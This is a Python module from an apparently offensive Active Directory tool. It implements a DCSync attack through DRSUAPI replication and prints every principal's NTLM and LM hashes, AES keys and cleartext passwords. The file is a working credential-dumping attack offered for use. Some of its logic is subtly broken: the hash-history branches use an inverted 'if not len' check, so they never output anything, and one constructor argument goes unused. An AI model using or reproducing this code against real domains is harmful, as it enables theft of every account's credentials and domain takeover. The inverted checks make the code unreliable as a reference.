
from DCSync.structures.Credentials import Credentials
from DCSync.structures.Target import Target
from DCSync.core.Logger import Logger
from DCSync.network.RPC import DRSUAPI

from typing import Iterator

class DCSync:
    """
    Use DRSUAPI over DCERPC to perform a DCSync.
    Based on Impacket secretsdump.py
    """

    def __init__(self, target: Target, credentials: Credentials, logger: Logger, method: str):
        self.__logger       = logger
        self.__target       = target
        self.__credentials  = credentials

    def sync(self, principals: Iterator) -> None:
        drsuapi = DRSUAPI(self.__credentials, self.__target, self.__logger)
        principalsSecrets = drsuapi.dRSNCChanges(principals)

        for principal in principalsSecrets:
            # Current NTLM Hash
            self.__logger.ok(f"{principal.sAMAccountName}:{principal.rid}:{principal.lmHash}:{principal.ntHash}")
            
            # AESKey
            if len(principal.aesKey):
                for aesKey in principal.aesKey:
                    self.__logger.ok(f"{principal.sAMAccountName}:{principal.rid}:{aesKey}")
            
            # Cleartext password
            if len(principal.cleartext):
                for cleartext in principal.cleartext:
                    self.__logger.ok(f"{principal.sAMAccountName}:{principal.rid}:{cleartext}")
            
            # LM Hash History
            if not len(principal.lmHistory):
                for lmHistory in principal.lmHistory:
                    self.__logger.ok(f"{principal.sAMAccountName}:{lmHistory}")
            
            # NT Hash History
            if not len(principal.ntHistory):
                for ntHistory in principal.ntHistory:
                    self.__logger.ok(f"{principal.sAMAccountName}:{ntHistory}")
